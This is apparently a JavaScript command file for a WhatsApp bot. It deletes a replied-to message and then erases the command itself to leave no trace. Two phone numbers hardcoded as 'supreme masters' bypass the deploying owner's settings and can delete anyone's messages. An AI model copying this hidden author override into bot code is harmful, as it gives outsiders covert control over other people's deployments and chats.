/**
 * Erreur Command - 𝐃𝐚𝐫𝐤 — ʟ'ᴏᴍʙʀᴇ ɪɴᴄᴀʀɴᴇ́
 * Supprime un message auquel tu as répondu (Maître Suprême bypass les restrictions)
 */

const config = require('../../config.js');

function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'erreur',
  aliases: ['er', 'e', 'error'],
  category: '👑 Owner',
  description: '『 𝐃𝐈𝐏𝐏𝐄𝐑 』➪ sᴜᴘᴘʀɪᴍᴇ ᴜɴ ᴍᴇssᴀɢᴇ ᴇɴ ʏ ʀᴇᴘᴏɴᴅᴀɴᴛ (ᴘᴏᴜᴠᴏɪʀ ᴀʙsᴏʟᴜ ᴘᴏᴜʀ ʟᴇ ᴍᴀɪᴛʀᴇ)',
  usage: `${prefix}erreur`,

  async execute(sock, msg, args, extra) {
    const { from, reply, react, isOwner } = extra;

    try {
      const supremeOwners = ['2290146202259', '2290155745907'];

      // 🛡️ EXTRACTION SÉCURISÉE DE TON NUMÉRO (Infaillible)
      let senderJid = msg.key.fromMe 
        ? sock.user.id 
        : (msg.key.participant || msg.key.remoteJid || '');
      
      const bareJid = senderJid.split('@')[0].split(':')[0];
      const senderNumber = bareJid.replace(/\D/g, '');

      // Routines d'authentification souveraine
      const isMaster = supremeOwners.includes(senderNumber);

      // 🛡️ Blindage de la détection de l'Owner du .env
      let isConfigOwner = false;
      if (config.ownerNumber) {
        const ownersArray = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
        isConfigOwner = ownersArray.some(n => {
          const cleanN = String(n).split('@')[0].split(':')[0].replace(/\D/g, '');
          return senderNumber === cleanN;
        });
      }

      // Seul le bot lui-même, l'owner configuré (.env via isOwner ou config), ou l'un des 2 maîtres suprêmes
      const isMe = msg.key.fromMe || isOwner === true || isConfigOwner || isMaster;

      if (!isMe) {
        return reply(`*❌ ${toSmallCaps('acces refuse. seul le maitre peut manier la gomme du spatio-temporel')}.*\n\n${extra.phrases.footer()}`);
      }

      const ctx = msg.message?.extendedTextMessage?.contextInfo;

      if (!ctx?.stanzaId) {
        return reply(
          `╭╼━≪• *💥 ᴇᴠᴀᴘᴏʀᴀᴛɪᴏɴ_ɪᴍᴍᴇᴅɪᴀᴛᴇ* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ᴇ́ᴄʜᴇᴄ ❌\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `*🔮 ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
          `*${toSmallCaps('reponds au message que tu souhaites effacer')}.*\n\n` +
          `  ${prefix}erreur\n\n` +
          extra.phrases.footer()
        );
      }

      const botJid = sock.user.id.split(':')[0].split('@')[0] + '@s.whatsapp.net';
      
      // Nettoyage également pour le créateur du message cité
      const rawQuotedParticipant = ctx.participant || ctx.remoteJid || '';
      const cleanQuotedUser = rawQuotedParticipant.split(':')[0].split('@')[0];
      const quotedParticipant = `${cleanQuotedUser}@s.whatsapp.net`;

      const isFromMe = quotedParticipant.includes(botJid.split('@')[0]) || ctx.stanzaId === msg.key.id;

      // 🛡️ SYSTÈME D'OMNIPOTENCE : Les maîtres peuvent tout supprimer, l'owner classique ne supprime que ses propres messages via cette commande.
      if (!isMaster && !isFromMe) {
        return reply(`*⚠️ ${toSmallCaps('ce message ne t\'appartient pas. utilise la commande')} \`${prefix}delete\` ${toSmallCaps('pour les messages des autres')}.*`);
      }

      const deleteTargetKey = { 
        remoteJid: from, 
        id: ctx.stanzaId, 
        fromMe: isFromMe 
      };

      // Si c'est en groupe et qu'on cible le message d'un tiers
      if (from.endsWith('@g.us')) {
        deleteTargetKey.participant = quotedParticipant;
      }

      await react('🪄'); 

      // 1. Effacement du message ciblé
      await sock.sendMessage(from, { delete: deleteTargetKey });

      // 2. Effacement de ton invocation pour ne laisser aucune trace
      await sock.sendMessage(from, { 
        delete: {
          remoteJid: from,
          id: msg.key.id,
          fromMe: msg.key.fromMe, 
          participant: msg.key.participant || msg.key.remoteJid
        } 
      });

    } catch (error) {
      console.error('[erreur cmd] error:', error);
      await reply(`*❌ ${toSmallCaps('impossible de faire disparaitre ce message')}.*\n\n${extra.phrases.footer()}`);
    }
  }
};
